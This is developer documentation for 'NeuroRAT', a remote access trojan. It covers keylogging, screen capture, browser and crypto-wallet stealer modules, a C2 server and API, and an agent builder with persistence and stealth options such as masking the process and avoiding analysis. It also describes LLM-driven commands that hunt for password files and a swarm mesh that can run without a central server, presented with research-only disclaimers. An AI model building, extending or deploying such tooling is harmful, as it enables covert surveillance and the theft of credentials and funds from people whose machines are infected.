# NeuroRAT Technical Documentation

## Introduction

This technical documentation provides developers with detailed information on the NeuroRAT system architecture, components, and development workflows. This document is intended for developers who want to extend, modify, or contribute to the NeuroRAT project.

## Development Environment Setup

### Requirements

- Python 3.9+ 
- Git
- Docker (optional, for containerized deployment)
- Virtualenv or conda (recommended for dependency isolation)

### Initial Setup

1. Clone the repository:
```bash
git clone https://github.com/your-repository/neurorat.git
cd neurorat
```

2. Create and activate a virtual environment:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

3. Install dependencies:
```bash
pip install -r requirements.txt
```

4. Install development dependencies:
```bash
pip install -r requirements-dev.txt
```

## Project Structure

```
neurorat/
├── agent_protocol/         # Core agent-server communication protocol
│   ├── client.py           # Client-side implementation
│   ├── server/             # Server-side implementation
│   └── shared/             # Shared code between client and server
├── agent_modules/          # Individual agent capabilities
│   ├── module_loader.py    # Module discovery and loading system
│   ├── keylogger.py        # Keylogging functionality
│   ├── screen_capture.py   # Screen capture and recording
│   ├── browser_stealer.py  # Browser data extraction
│   ├── crypto_stealer.py   # Cryptocurrency wallet extraction
│   └── system_stealer.py   # System information gathering
├── llm_processor/          # LLM integration
│   ├── processor.py        # Core LLM processing logic
│   ├── apis/               # API connectors for various LLM providers
│   ├── prompts/            # Pre-defined prompts for different tasks
│   └── local/              # Local model implementations
├── server/                 # C2 server implementation
│   ├── api/                # REST API endpoints
│   ├── database/           # Database models and connections
│   ├── web_interface/      # Web dashboard
│   └── handlers/           # Command handlers
├── build_agent.py          # Agent builder utility
├── neurorat_agent.py       # Main agent file
├── neurorat_launcher.py    # Agent launcher
└── server_monitor.py       # Server monitoring utility
```

## Core Components

### Agent Protocol

The Agent Protocol is responsible for the communication between the C2 server and agents. It uses a custom protocol built on top of HTTP/HTTPS for reliability and firewall traversal.

#### Key Classes and Methods

- `AgentClient` (`agent_protocol/client.py`): Client-side implementation for agents to communicate with the C2 server.
  - `connect()`: Establishes connection with the C2 server
  - `send_data(data)`: Sends data to the C2 server
  - `receive_command()`: Receives commands from the C2 server
  - `heartbeat()`: Sends periodic heartbeats to maintain connection

- `AgentServer` (`agent_protocol/server/__init__.py`): Server-side implementation for the C2 server.
  - `start()`: Starts the C2 server
  - `register_agent(agent_info)`: Registers a new agent
  - `send_command(agent_id, command)`: Sends a command to a specific agent
  - `broadcast_command(command)`: Sends a command to all connected agents

### Module Loader

The Module Loader (`agent_modules/module_loader.py`) provides a plugin system for dynamically loading agent capabilities.

```python
# Example: Loading and executing a module
from agent_modules.module_loader import ModuleLoader

# Initialize the module loader
loader = ModuleLoader()

# Discover available modules
available_modules = loader.discover_modules()
print(f"Available modules: {available_modules}")

# Load a specific module
loader.load_module("keylogger")

# Execute a module
result = loader.run_module("keylogger", action="start", output_dir="/tmp/logs")
```

#### Creating New Modules

To create a new module, follow these steps:

1. Create a new Python file in the `agent_modules/` directory
2. Implement a class that provides the module functionality
3. Implement a `run()` method that serves as the entry point

Example module template:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Module: MyModule
Description: Brief description of what this module does
"""

import os
import sys
import json
import logging
from datetime import datetime
from typing import Dict, Any

class MyModule:
    """My custom module implementation"""
    
    def __init__(self, output_dir: str = None):
        """Initialize the module"""
        self.output_dir = output_dir or os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Configure logging
        log_file = os.path.join(self.output_dir, "my_module.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger("MyModule")
    
    def do_something(self):
        """Main functionality of the module"""
        try:
            # Implement your module's functionality here
            self.logger.info("Module executed successfully")
            return {"status": "success", "data": "Some result data"}
        except Exception as e:
            self.logger.error(f"Error in module execution: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def run(self, **kwargs) -> Dict[str, Any]:
        """Entry point for the module"""
        try:
            # Parse arguments
            action = kwargs.get("action", "default_action")
            
            # Execute the requested action
            if action == "do_something":
                return self.do_something()
            else:
                return {"status": "error", "message": f"Unknown action: {action}"}
        except Exception as e:
            self.logger.error(f"Error running module: {str(e)}")
            return {"status": "error", "message": str(e)}

def main():
    """Main function when module is run directly"""
    output_dir = sys.argv[1] if len(sys.argv) > 1 else None
    
    module = MyModule(output_dir)
    result = module.run(action="do_something")
    
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### LLM Processor

The LLM Processor integrates with various Large Language Model APIs to provide natural language understanding and generation capabilities.

#### Using the LLM Processor

```python
# Example: Using the LLM processor
from llm_processor import LLMProcessor

# Initialize with a specific backend
processor = LLMProcessor(backend="openai")

# Process a natural language command
result = processor.process_command(
    command="Check if there are any password files in the user's documents folder",
    context={"username": "user1", "platform": "windows"}
)

# Execute the structured command
if result.success:
    structured_command = result.command
    # Execute structured command...
else:
    print(f"Failed to process command: {result.error}")
```

#### Adding a New LLM Backend

To add a new LLM backend:

1. Create a new file in `llm_processor/apis/`
2. Implement the `BaseLLMBackend` interface
3. Register your backend in `llm_processor/__init__.py`

Example:

```python
# llm_processor/apis/my_custom_llm.py
from ..base import BaseLLMBackend

class MyCustomLLMBackend(BaseLLMBackend):
    def __init__(self, api_key=None, **kwargs):
        super().__init__()
        self.api_key = api_key or os.environ.get("MY_CUSTOM_LLM_API_KEY")
        # Additional initialization
    
    def process_prompt(self, prompt, **kwargs):
        # Implement your LLM API call here
        response = self._call_api(prompt)
        return response
    
    def _call_api(self, prompt):
        # Implement actual API call
        pass
```

Then register it:

```python
# llm_processor/__init__.py
from .apis.my_custom_llm import MyCustomLLMBackend

# Register in the BACKENDS dictionary
BACKENDS = {
    "openai": OpenAIBackend,
    "anthropic": AnthropicBackend,
    "my_custom_llm": MyCustomLLMBackend,
    # ...
}
```

## Building and Deploying Agents

The `build_agent.py` script provides utilities for packaging the agent for deployment:

```bash
# Basic usage
python build_agent.py --output dist --type exe

# Full options
python build_agent.py --server-host c2.example.com --server-port 443 \
                     --output dist --type all --persist yes
```

### Build Options

- `--server-host`: C2 server hostname or IP address
- `--server-port`: C2 server port number
- `--output`: Output directory for the built agent
- `--type`: Package type (zip, exe, base64, all)
- `--persist`: Enable persistence mechanisms (yes/no)

### Agent Configuration

Agent configuration is stored in a JSON format:

```json
{
  "agent_id": "auto",
  "c2_server": {
    "host": "c2.example.com",
    "port": 443,
    "encryption_key": "your-encryption-key",
    "verify_ssl": true
  },
  "llm": {
    "enabled": true,
    "local_processing": false,
    "api_endpoint": "https://api.openai.com/v1/chat/completions",
    "api_key": "your-api-key"
  },
  "modules": {
    "keylogger": {"enabled": true},
    "screen_capture": {"enabled": true, "interval": 60},
    "browser_stealer": {"enabled": true},
    "crypto_stealer": {"enabled": true},
    "system_stealer": {"enabled": true}
  },
  "stealth": {
    "hide_console": true,
    "mask_process": true,
    "avoid_analysis": true
  },
  "persistence": {
    "enabled": false,
    "method": "registry",
    "startup_name": "System Service"
  }
}
```

## Testing

### Unit Tests

Run unit tests using pytest:

```bash
pytest tests/
```

### Integration Tests

Run integration tests:

```bash
pytest tests/integration/
```

### Local Development Server

Start a local development C2 server:

```bash
python server_monitor.py --debug
```

## API Documentation

### Server API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/agents` | GET | List all registered agents |
| `/api/agents/<agent_id>` | GET | Get information about a specific agent |
| `/api/agents/<agent_id>/command` | POST | Send a command to an agent |
| `/api/data` | GET | Retrieve collected data |
| `/api/tasks` | GET | List all tasks |
| `/api/tasks/<task_id>` | GET | Get task details |

### Server API Authentication

The server API uses token-based authentication. Include the token in the Authorization header:

```
Authorization: Bearer your-api-token
```

## Contributing

1. Fork the repository on GitHub
2. Create a feature branch (`git checkout -b feature/your-feature`)
3. Implement your changes
4. Add tests for your changes
5. Run the test suite to ensure everything works
6. Commit your changes (`git commit -am 'Add new feature'`)
7. Push to the branch (`git push origin feature/your-feature`)
8. Create a new Pull Request

## Troubleshooting

### Common Issues

1. **Module import errors**:
   - Check that all dependencies are installed
   - Verify Python path includes the project root

2. **Connection issues**:
   - Verify network connectivity
   - Check firewall settings
   - Validate server host and port configuration

3. **LLM API errors**:
   - Verify API key is valid
   - Check API endpoint is correct
   - Ensure API rate limits haven't been exceeded

### Debug Mode

Enable debug mode for more verbose logging:

```python
# Enable debug logging
import logging
logging.basicConfig(level=logging.DEBUG)
```

Or when running the server:

```bash
python server_monitor.py --debug
```

## Swarm Intelligence Module

### Overview

The Swarm Intelligence module (`agent_modules/swarm_intelligence.py`) implements a decentralized mesh network of agents capable of collective decision-making without requiring a central command and control server. This creates a resilient, self-organizing network that can continue to operate even if individual nodes or the C2 server are compromised.

⚠️ **WARNING:** This module is provided strictly for academic and research purposes. Deploying this module in a production environment could create an uncontrolled self-organizing network, which may be illegal and dangerous. **Use only in a controlled research environment**.

### Key Features

- **Decentralized Communication**: Agents can communicate directly with each other, forming a mesh network without requiring a central server
- **Collective Decision Making**: Uses distributed consensus algorithms for group decision-making
- **Task Distribution**: Intelligent distribution of tasks across the swarm based on capabilities and resources
- **Resilient Network Structure**: Network continues to function even if individual nodes are disabled
- **Stealth Operations**: Minimizes network footprint and blends traffic with legitimate services

### Architecture

The Swarm Intelligence module consists of three main components:

1. **SwarmNode**: Main class that manages node identification, communication, and network topology
2. **ConsensusEngine**: Component responsible for distributed decision-making using voting mechanisms
3. **TaskDistributor**: Component for distributing and executing tasks across the swarm

#### SwarmNode

The SwarmNode class manages the core functionality:

- Network discovery and connection management
- Secure communication between nodes
- Maintenance of the mesh network topology
- Data synchronization across the swarm

#### ConsensusEngine

The ConsensusEngine implements a Byzantine fault-tolerant consensus mechanism:

- Proposal and voting system for collective decisions
- Threshold-based consensus determination (typically 66% agreement)
- Execution of agreed-upon actions
- Tracking of decision history

#### TaskDistributor

The TaskDistributor enables efficient work distribution:

- Task creation and assignment
- Intelligent node selection based on capabilities
- Task execution and result collection
- Result propagation back to the swarm

### Usage

The Swarm Intelligence module can be initialized as follows:

```python
from agent_modules.swarm_intelligence import SwarmNode

# Create a swarm node with optional bootstrap nodes
swarm_node = SwarmNode(
    listen_port=8443,  # Optional, random if not specified
    bootstrap_nodes=["192.168.1.100:8443"],  # Optional, initial nodes to connect to
    discovery_enabled=True,  # Enable automatic discovery of other nodes
    stealth_mode=True,  # Minimize network footprint
    agent_context={"capabilities": ["keylogger", "screen_capture"]}  # Share agent capabilities
)

# Start the node
swarm_node.start()

# Create a consensus proposal
consensus_engine = swarm_node.consensus_engine
proposal_id = consensus_engine.propose_action(
    action_type="data_collection",
    action_data={
        "target_type": "system_info",
        "priority": "high"
    }
)

# Create and distribute a task
task_distributor = swarm_node.task_distributor
task_id = task_distributor.create_task(
    task_type="reconnaissance",
    task_data={
        "target_type": "network"
    }
)

# Stop the node when done
swarm_node.stop()
```

### Security Considerations

Due to the highly distributed nature of this module, several security measures are implemented:

1. **Encrypted Communications**: All inter-node traffic is encrypted
2. **Node Authentication**: Nodes authenticate each other before exchanging data
3. **Activity Throttling**: Communication is rate-limited to avoid detection
4. **Port Selection**: Uses common ports to blend with legitimate traffic
5. **Limited Propagation**: By default, nodes do not automatically spread to new systems

### Experimental Features

These features are commented out in the code and should remain disabled:

1. **Network Exploration**: Automated discovery of network topology
2. **Self-Propagation**: Capability to spread to new systems
3. **Unified Control**: Ability to coordinate all nodes for a single purpose

### Ethical Usage Guidelines

This module must only be used:

1. In isolated research environments
2. On systems you own or have explicit permission to test
3. For legitimate security research purposes
4. To understand and develop defenses against similar technologies

Never deploy this module on production systems or use it for unauthorized access. 